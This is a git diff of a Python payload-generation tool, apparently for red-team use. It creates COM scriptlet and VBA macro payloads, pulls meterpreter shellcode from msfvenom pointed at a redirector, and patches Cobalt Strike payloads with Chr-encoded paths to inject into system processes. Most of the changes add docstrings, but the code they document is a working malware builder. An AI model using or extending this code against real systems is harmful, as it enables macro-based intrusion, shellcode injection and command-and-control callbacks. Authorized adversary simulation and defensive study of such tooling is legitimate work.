@@ -18,13 +18,37 @@ def genClassID():
 	'''
 	Generates a Class ID aka uuid for the COM scriptlet payload.
 
-	Returns uuid
+	Returns:
+		uuid4() (string): a random class id
 	'''
+
 	return uuid4()
+
+def genProgID(size=8, chars=ascii_uppercase + digits):
+	'''
+	Generates a pseudo random program id for the COM scriptlet payload.
+
+	Args:
+		size (int): size/length of the program id
+		chars (list): uppercase letters and numbers
+	Returns:
+		progid (string): a random program id
+	'''
+	progid = ''.join(choice(chars) for _ in range(size))
+
+	return progid
 
 def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 	'''
 	Generates a COM Scriptlet payload aka sct file.
+
+	Args:
+		framework (string): name of the framework
+		stagingMethod (string): name of the staging method
+		redirector (list): ip address and port
+		x86 (string): x86 process to inject
+		x64 (string): x64 process to inject
+		cspayload (string): file name of Cobalt Strike payload
 	'''
 	if 'CobaltStrike' in framework:
 		modifyCobaltStrikePayload(cspayload , x86, x64)
@@ -42,15 +66,6 @@ def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 	else:
 		print('{0} framework is not supported yet'.format(framework))
 
-def genProgID(size=8, chars=ascii_uppercase + digits):
-	'''
-	Generates a pseudo random program id for the COM scriptlet payload.
-
-	Returns a program id
-	'''
-	progid = ''.join(choice(chars) for _ in range(size))
-	return progid
-
 def genVBAMacro(template, shellCode, x86, x64):
 	'''
 	Generates a visual basic macro. This is a lazy version until we 
@@ -58,6 +73,12 @@ def genVBAMacro(template, shellCode, x86, x64):
 	and line length within vba. Ideally, this will be switched over to a
 	VBA Macro COM Scriptlet template and we build the entire Chr encoded
 	string.
+
+	Args:
+		template (string): file name of template
+		shellCode (string): the shellcode
+		x86 (string): x86 process to inject
+		x64 (string): x64 process to inject
 	'''
 	copyfile('./templates/{0}_vba_macro.sct'.format(template.lower()), 'payload.sct')
 	fileFindReplace('payload.sct', 'exampleprogid', genProgID())
@@ -106,16 +127,16 @@ def genVBAMacro(template, shellCode, x86, x64):
 			else:
 				payloadFile.write(item)
 
-	# for i in start + textToEncodeList + end:
-	# 	print(i)
-
 def getMetasploitShellCode(redirector):
 	'''
 	Generates a metaspoit vba macro via msfvenom. 
 	Parses the Array of shellcode via regex from the generated macro.
 	Create a string of the meterpreter shellcode.
 
-	Returns string of shellcode
+	Args:
+		redirector (list): ip address and port
+	Returns:
+		msfShellCode (string): metasploit shellcode
 	'''
 	code = ''
 	if which('msfvenom'):
@@ -137,6 +158,11 @@ def modifyCobaltStrikePayload(cspayload, x86, x64):
 	Specifiy a signed binary from the following locations in the config.
 	x86 - C:\Windows\System32\
 	x64 - C:\Windows\SysWOW64\
+
+	Args:
+		cspayload (string): file name of Cobalt Strike payload
+		x86 (string): x86 process to inject
+		x64 (string): x64 process to inject
 	'''
 	x86_encoded_path = 'Chr(114)&Chr(34)&Chr(41)&Chr(32)&Chr(38)&Chr(32)&Chr(34)&Chr(92)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(51)&Chr(50)&Chr(92)&Chr(92)&'
 	x64_encoded_path = 'Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(87)&Chr(79)&Chr(87)&Chr(54)&Chr(52)&Chr(92)&Chr(92)&'
